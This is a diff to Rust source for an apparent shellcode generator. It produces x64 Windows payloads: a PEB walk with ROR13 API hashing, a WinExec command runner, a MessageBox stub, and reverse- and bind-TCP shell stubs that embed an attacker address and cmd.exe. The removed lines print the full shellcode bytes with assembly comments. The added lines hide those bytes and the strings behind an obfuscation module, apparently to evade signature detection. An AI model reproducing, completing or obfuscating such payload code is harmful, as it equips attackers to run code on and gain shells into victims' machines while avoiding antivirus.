@@ -208,7 +208,9 @@ const HASH_LOADLIBRARYA: u32 = 0xEC0E4E8E;
 const HASH_MESSAGEBOXA: u32 = 0xBC4DA2A8;
 const HASH_CREATEPROCESSA: u32 = 0x16B3FE72;
 
-const DATA_MARKER: [u8; 8] = [0xCC, 0xCC, 0xCC, 0xCC, 0x90, 0x90, 0x90, 0x90];
+fn data_marker() -> [u8; 8] {
+    crate::obf::ba(&crate::obf::E_DATA_MARKER)
+}
 
 // find_function: resolve an API by ROR13 hash from a module's export table.
 // Input:  ecx = NumberOfNames, rdx = AddressOfNames VA,
@@ -216,47 +218,13 @@ const DATA_MARKER: [u8; 8] = [0xCC, 0xCC, 0xCC, 0xCC, 0x90, 0x90, 0x90, 0x90];
 // Output: rax = function VA
 // 65 bytes; all internal jumps are position-independent.
 // rdx is saved/restored around the hash loop (movzx edx clobbers it).
-#[rustfmt::skip]
-const SUB_FIND_FUNCTION: &[u8] = &[
-    0xFF, 0xC9,                      // dec ecx
-    0x48, 0x63, 0x04, 0x8A,          // movsxd rax, dword [rdx+rcx*4]
-    0x48, 0x01, 0xE8,                // add rax, rbp
-    0x41, 0x52,                      // push r10
-    0x52,                            // push rdx
-    0x45, 0x31, 0xD2,                // xor r10d, r10d
-    // hash_byte: (sub-offset 15)
-    0x0F, 0xB6, 0x10,                // movzx edx, byte [rax]
-    0x84, 0xD2,                      // test dl, dl
-    0x74, 0x0C,                      // jz hash_done  (22 → 34, rel = +12)
-    0x41, 0xC1, 0xCA, 0x0D,          // ror r10d, 13
-    0x41, 0x01, 0xD2,                // add r10d, edx
-    0x48, 0xFF, 0xC0,                // inc rax
-    0xEB, 0xED,                      // jmp hash_byte (34 → 15, rel = -19)
-    // hash_done: (sub-offset 34)
-    0x45, 0x39, 0xDA,                // cmp r10d, r11d
-    0x5A,                            // pop rdx
-    0x41, 0x5A,                      // pop r10
-    0x75, 0xD6,                      // jne find_function (42 → 0, rel = -42)
-    0x8B, 0x43, 0x24,                // mov eax, [rbx+0x24]
-    0x48, 0x01, 0xE8,                // add rax, rbp
-    0x0F, 0xB7, 0x04, 0x48,          // movzx eax, word [rax+rcx*2]
-    0x8B, 0x53, 0x1C,                // mov edx, [rbx+0x1C]
-    0x48, 0x01, 0xEA,                // add rdx, rbp
-    0x8B, 0x04, 0x82,                // mov eax, [rdx+rax*4]
-    0x48, 0x01, 0xE8,                // add rax, rbp
-    0xC3,                            // ret
-];
+fn sub_find_function() -> Vec<u8> {
+    crate::obf::b(&crate::obf::E_SUB_FIND_FUNCTION)
+}
 
-// get_data_ptr: call/pop trick to get a pointer to the data after the marker.
-// Output: rax = first byte after the 8-byte DATA_MARKER.
-// 11 bytes; `add rax, 14` = skip 5 remaining bytes + 8 marker bytes + 1 alignment.
-#[rustfmt::skip]
-const SUB_GET_DATA_PTR: &[u8] = &[
-    0xE8, 0x00, 0x00, 0x00, 0x00,    // call $+5
-    0x58,                            // pop rax
-    0x48, 0x83, 0xC0, 0x0E,          // add rax, 14
-    0xC3,                            // ret
-];
+fn sub_get_data_ptr() -> Vec<u8> {
+    crate::obf::b(&crate::obf::E_SUB_GET_DATA_PTR)
+}
 
 #[derive(Clone, Copy)]
 enum CallTarget { FindFunction, GetDataPtr }
@@ -267,16 +235,19 @@ struct CallPatch {
 }
 
 fn assemble(main_code: &[u8], patches: &[CallPatch]) -> Vec<u8> {
+    let sfn = sub_find_function();
+    let sdp = sub_get_data_ptr();
+    let dm = data_marker();
     let find_fn_start = main_code.len();
-    let get_data_start = find_fn_start + SUB_FIND_FUNCTION.len();
+    let get_data_start = find_fn_start + sfn.len();
 
     let mut code = Vec::with_capacity(
-        main_code.len() + SUB_FIND_FUNCTION.len() + SUB_GET_DATA_PTR.len() + DATA_MARKER.len(),
+        main_code.len() + sfn.len() + sdp.len() + dm.len(),
     );
     code.extend_from_slice(main_code);
-    code.extend_from_slice(SUB_FIND_FUNCTION);
-    code.extend_from_slice(SUB_GET_DATA_PTR);
-    code.extend_from_slice(&DATA_MARKER);
+    code.extend_from_slice(&sfn);
+    code.extend_from_slice(&sdp);
+    code.extend_from_slice(&dm);
 
     for patch in patches {
         let next_ip = patch.offset + 5;
@@ -300,49 +271,14 @@ fn assemble(main_code: &[u8], patches: &[CallPatch]) -> Vec<u8> {
 // ============================================================================
 const EXEC_MAX_CMD: usize = 260;
 
-#[rustfmt::skip]
-const MAIN_EXEC: &[u8] = &[
-    0xFC,                                                     // cld
-    0x48, 0x83, 0xEC, 0x28,                                  // sub rsp, 0x28
-
-    // PEB walk → kernel32 base in rbp
-    0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,   // mov rax, gs:[0x60]
-    0x48, 0x8B, 0x40, 0x18,                                   // mov rax, [rax+0x18]
-    0x48, 0x8B, 0x70, 0x20,                                   // mov rsi, [rax+0x20]
-    0x48, 0x8B, 0x36,                                         // mov rsi, [rsi]
-    0x48, 0x8B, 0x36,                                         // mov rsi, [rsi]
-    0x48, 0x8B, 0x6E, 0x20,                                   // mov rbp, [rsi+0x20]
-
-    // Parse PE exports
-    0x8B, 0x45, 0x3C,                                         // mov eax, [rbp+0x3C]
-    0x48, 0x01, 0xE8,                                         // add rax, rbp
-    0x8B, 0x80, 0x88, 0x00, 0x00, 0x00,                       // mov eax, [rax+0x88]
-    0x48, 0x01, 0xE8,                                         // add rax, rbp
-    0x48, 0x89, 0xC3,                                         // mov rbx, rax
-    0x8B, 0x48, 0x18,                                         // mov ecx, [rax+0x18]
-    0x8B, 0x50, 0x20,                                         // mov edx, [rax+0x20]
-    0x48, 0x01, 0xEA,                                         // add rdx, rbp
-
-    // Find WinExec (call find_function at offset 65)
-    0x41, 0xBB, 0x98, 0xFE, 0x8A, 0x0E,                      // mov r11d, HASH_WINEXEC
-    0xE8, 0x00, 0x00, 0x00, 0x00,                             // call find_function [65]
-    0x48, 0x89, 0xC7,                                         // mov rdi, rax
-
-    // Get data ptr (call get_data_ptr at offset 73)
-    0xE8, 0x00, 0x00, 0x00, 0x00,                             // call get_data_ptr [73]
-    0x48, 0x89, 0xC1,                                         // mov rcx, rax
-    0xBA, 0x05, 0x00, 0x00, 0x00,                             // mov edx, 5 (SW_SHOW)
-    0xFF, 0xD7,                                               // call rdi
-
-    // Clean return — let thread runtime handle exit
-    0x48, 0x83, 0xC4, 0x28,                                   // add rsp, 0x28
-    0x31, 0xC0,                                               // xor eax, eax
-    0xC3,                                                     // ret
-];
+fn main_exec() -> Vec<u8> {
+    crate::obf::b(&crate::obf::E_MAIN_EXEC)
+}
 // 95 bytes; patches at 65, 73
 
 fn generate_exec(command: &str) -> Result<Vec<u8>, String> {
-    let mut sc = assemble(MAIN_EXEC, &[
+    let me = main_exec();
+    let mut sc = assemble(&me, &[
         CallPatch { offset: 65, target: CallTarget::FindFunction },
         CallPatch { offset: 73, target: CallTarget::GetDataPtr },
     ]);
@@ -361,76 +297,14 @@ fn generate_exec(command: &str) -> Result<Vec<u8>, String> {
 const MSGBOX_TITLE_SIZE: usize = 128;
 const MSGBOX_TEXT_SIZE: usize = 128;
 
-#[rustfmt::skip]
-const MAIN_MSGBOX: &[u8] = &[
-    0xFC,                                                     // cld
-    0x48, 0x83, 0xEC, 0x28,                                  // sub rsp, 0x28
-
-    // PEB walk → kernel32 base in rbp
-    0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,
-    0x48, 0x8B, 0x40, 0x18,
-    0x48, 0x8B, 0x70, 0x20,
-    0x48, 0x8B, 0x36,
-    0x48, 0x8B, 0x36,
-    0x48, 0x8B, 0x6E, 0x20,
-
-    // Parse PE exports
-    0x8B, 0x45, 0x3C,
-    0x48, 0x01, 0xE8,
-    0x8B, 0x80, 0x88, 0x00, 0x00, 0x00,
-    0x48, 0x01, 0xE8,
-    0x48, 0x89, 0xC3,
-    0x8B, 0x48, 0x18,
-    0x8B, 0x50, 0x20,
-    0x48, 0x01, 0xEA,
-
-    // Find LoadLibraryA [65]
-    0x41, 0xBB, 0x8E, 0x4E, 0x0E, 0xEC,                      // mov r11d, HASH_LOADLIBRARYA
-    0xE8, 0x00, 0x00, 0x00, 0x00,                             // call find_function [65]
-    0x49, 0x89, 0xC4,                                         // mov r12, rax
-
-    // Get data section pointer [73]
-    0xE8, 0x00, 0x00, 0x00, 0x00,                             // call get_data_ptr [73]
-    0x49, 0x89, 0xC6,                                         // mov r14, rax
-
-    // LoadLibraryA("user32.dll") at data + 256
-    0x4C, 0x89, 0xF1,                                         // mov rcx, r14
-    0x48, 0x81, 0xC1, 0x00, 0x01, 0x00, 0x00,                // add rcx, 256
-    0x41, 0xFF, 0xD4,                                         // call r12
-
-    // Parse user32.dll exports
-    0x48, 0x89, 0xC5,                                         // mov rbp, rax
-    0x8B, 0x45, 0x3C,
-    0x48, 0x01, 0xE8,
-    0x8B, 0x80, 0x88, 0x00, 0x00, 0x00,
-    0x48, 0x01, 0xE8,
-    0x48, 0x89, 0xC3,
-    0x8B, 0x48, 0x18,
-    0x8B, 0x50, 0x20,
-    0x48, 0x01, 0xEA,
-
-    // Find MessageBoxA in user32 [130]
-    0x41, 0xBB, 0xA8, 0xA2, 0x4D, 0xBC,                      // mov r11d, HASH_MESSAGEBOXA
-    0xE8, 0x00, 0x00, 0x00, 0x00,                             // call find_function [130]
-
-    // MessageBoxA(NULL, text, title, MB_OK)
-    0x48, 0x89, 0xC7,                                         // mov rdi, rax
-    0x48, 0x31, 0xC9,                                         // xor rcx, rcx      ; hWnd = NULL
-    0x4C, 0x89, 0xF2,                                         // mov rdx, r14       ; data ptr
-    0x48, 0x81, 0xC2, 0x80, 0x00, 0x00, 0x00,                // add rdx, 128       ; → text body
-    0x4D, 0x89, 0xF0,                                         // mov r8, r14        ; → title
-    0x4D, 0x31, 0xC9,                                         // xor r9, r9         ; MB_OK
-    0xFF, 0xD7,                                               // call rdi
-
-    // Clean return
-    0x48, 0x83, 0xC4, 0x28,                                   // add rsp, 0x28
-    0x31, 0xC0,                                               // xor eax, eax
-    0xC3,                                                     // ret
-];
+fn main_msgbox() -> Vec<u8> {
+    crate::obf::b(&crate::obf::E_MAIN_MSGBOX)
+}
 // 166 bytes; patches at 65, 73, 130
 
 fn generate_messagebox(title: &str, text: &str) -> Result<Vec<u8>, String> {
-    let mut sc = assemble(MAIN_MSGBOX, &[
+    let mm = main_msgbox();
+    let mut sc = assemble(&mm, &[
         CallPatch { offset: 65, target: CallTarget::FindFunction },
         CallPatch { offset: 73, target: CallTarget::GetDataPtr },
         CallPatch { offset: 130, target: CallTarget::FindFunction },
@@ -445,7 +319,9 @@ fn generate_messagebox(title: &str, text: &str) -> Result<Vec<u8>, String> {
         .copy_from_slice(&xb[..xb.len().min(MSGBOX_TEXT_SIZE - 1)]);
     sc.extend_from_slice(&title_buf);
     sc.extend_from_slice(&text_buf);
-    sc.extend_from_slice(b"user32.dll\0");
+    let u32dll = crate::obf::s(crate::obf::USER32);
+    sc.extend_from_slice(u32dll.as_bytes());
+    sc.push(0);
     Ok(sc)
 }
 
@@ -455,47 +331,9 @@ fn generate_messagebox(title: &str, text: &str) -> Result<Vec<u8>, String> {
 // Data layout: [sockaddr_in 16 bytes]["ws2_32.dll\0"]["cmd.exe\0"]
 // ============================================================================
 
-#[rustfmt::skip]
-const MAIN_SHELL_STUB: &[u8] = &[
-    0xFC,                                                     // cld
-    0x48, 0x83, 0xEC, 0x50,                                  // sub rsp, 0x50
-
-    // PEB walk → kernel32 base in rbp
-    0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,
-    0x48, 0x8B, 0x40, 0x18,
-    0x48, 0x8B, 0x70, 0x20,
-    0x48, 0x8B, 0x36,
-    0x48, 0x8B, 0x36,
-    0x48, 0x8B, 0x6E, 0x20,
-
-    // Parse PE exports
-    0x8B, 0x45, 0x3C,
-    0x48, 0x01, 0xE8,
-    0x8B, 0x80, 0x88, 0x00, 0x00, 0x00,
-    0x48, 0x01, 0xE8,
-    0x48, 0x89, 0xC3,
-    0x8B, 0x48, 0x18,
-    0x8B, 0x50, 0x20,
-    0x48, 0x01, 0xEA,
-
-    // Find LoadLibraryA [65]
-    0x41, 0xBB, 0x8E, 0x4E, 0x0E, 0xEC,
-    0xE8, 0x00, 0x00, 0x00, 0x00,                             // call find_function [65]
-    0x49, 0x89, 0xC4,                                         // r12 = LoadLibraryA
-
-    // Reload, find CreateProcessA [88]
-    0x8B, 0x4B, 0x18,
-    0x8B, 0x53, 0x20,
-    0x48, 0x01, 0xEA,
-    0x41, 0xBB, 0x72, 0xFE, 0xB3, 0x16,
-    0xE8, 0x00, 0x00, 0x00, 0x00,                             // call find_function [88]
-    0x49, 0x89, 0xC5,                                         // r13 = CreateProcessA
-
-    // Clean return (socket logic not yet implemented)
-    0x48, 0x83, 0xC4, 0x50,                                   // add rsp, 0x50
-    0x31, 0xC0,                                               // xor eax, eax
-    0xC3,                                                     // ret
-];
+fn main_shell_stub() -> Vec<u8> {
+    crate::obf::b(&crate::obf::E_MAIN_SHELL_STUB)
+}
 // 103 bytes; patches at 65, 88
 
 const REVTCP_FAMILY_OFFSET: usize = 0;
@@ -506,7 +344,8 @@ fn generate_reverse_tcp(lhost: &str, lport: u16) -> Result<Vec<u8>, String> {
     let ip = parse_ipv4(lhost)?;
     let port = encode_port(lport);
 
-    let mut sc = assemble(MAIN_SHELL_STUB, &[
+    let ms = main_shell_stub();
+    let mut sc = assemble(&ms, &[
         CallPatch { offset: 65, target: CallTarget::FindFunction },
         CallPatch { offset: 88, target: CallTarget::FindFunction },
     ]);
@@ -517,8 +356,12 @@ fn generate_reverse_tcp(lhost: &str, lport: u16) -> Result<Vec<u8>, String> {
     sockaddr[REVTCP_IP_OFFSET..REVTCP_IP_OFFSET + 4].copy_from_slice(&ip);
 
     sc.extend_from_slice(&sockaddr);
-    sc.extend_from_slice(b"ws2_32.dll\0");
-    sc.extend_from_slice(b"cmd.exe\0");
+    let ws = crate::obf::s(crate::obf::WS2_32);
+    sc.extend_from_slice(ws.as_bytes());
+    sc.push(0);
+    let cmd = crate::obf::s(crate::obf::CMD_EXE);
+    sc.extend_from_slice(cmd.as_bytes());
+    sc.push(0);
     Ok(sc)
 }
 
@@ -529,7 +372,8 @@ fn generate_reverse_tcp(lhost: &str, lport: u16) -> Result<Vec<u8>, String> {
 fn generate_bind_tcp(lport: u16) -> Result<Vec<u8>, String> {
     let port = encode_port(lport);
 
-    let mut sc = assemble(MAIN_SHELL_STUB, &[
+    let ms = main_shell_stub();
+    let mut sc = assemble(&ms, &[
         CallPatch { offset: 65, target: CallTarget::FindFunction },
         CallPatch { offset: 88, target: CallTarget::FindFunction },
     ]);
@@ -539,8 +383,12 @@ fn generate_bind_tcp(lport: u16) -> Result<Vec<u8>, String> {
     sockaddr[3] = port[1];
 
     sc.extend_from_slice(&sockaddr);
-    sc.extend_from_slice(b"ws2_32.dll\0");
-    sc.extend_from_slice(b"cmd.exe\0");
+    let ws = crate::obf::s(crate::obf::WS2_32);
+    sc.extend_from_slice(ws.as_bytes());
+    sc.push(0);
+    let cmd = crate::obf::s(crate::obf::CMD_EXE);
+    sc.extend_from_slice(cmd.as_bytes());
+    sc.push(0);
     Ok(sc)
 }
 
@@ -822,39 +670,39 @@ mod tests {
     #[test]
     fn test_data_marker_present_in_exec() {
         let sc = generate_exec("test").unwrap();
-        assert!(sc.windows(DATA_MARKER.len()).any(|w| w == DATA_MARKER));
+        let dm = data_marker();
+        assert!(sc.windows(dm.len()).any(|w| w == dm));
     }
 
     #[test]
     fn test_assemble_patches_call_offsets() {
-        let sc = assemble(MAIN_EXEC, &[
+        let me = main_exec();
+        let sc = assemble(&me, &[
             CallPatch { offset: 65, target: CallTarget::FindFunction },
             CallPatch { offset: 88, target: CallTarget::FindFunction },
             CallPatch { offset: 96, target: CallTarget::GetDataPtr },
         ]);
-        let find_fn_start = MAIN_EXEC.len();
-        let get_data_start = find_fn_start + SUB_FIND_FUNCTION.len();
+        let sfn = sub_find_function();
+        let find_fn_start = me.len();
+        let get_data_start = find_fn_start + sfn.len();
 
-        // First call find_function at offset 65
         let rel1 = i32::from_le_bytes([sc[66], sc[67], sc[68], sc[69]]);
         assert_eq!(rel1, (find_fn_start as i32) - 70);
 
-        // Second call find_function at offset 88
         let rel2 = i32::from_le_bytes([sc[89], sc[90], sc[91], sc[92]]);
         assert_eq!(rel2, (find_fn_start as i32) - 93);
 
-        // Call get_data_ptr at offset 96
         let rel3 = i32::from_le_bytes([sc[97], sc[98], sc[99], sc[100]]);
         assert_eq!(rel3, (get_data_start as i32) - 101);
     }
 
     #[test]
     fn test_sub_find_function_size() {
-        assert_eq!(SUB_FIND_FUNCTION.len(), 65);
+        assert_eq!(sub_find_function().len(), 65);
     }
 
     #[test]
     fn test_sub_get_data_ptr_size() {
-        assert_eq!(SUB_GET_DATA_PTR.len(), 11);
+        assert_eq!(sub_get_data_ptr().len(), 11);
     }
 }
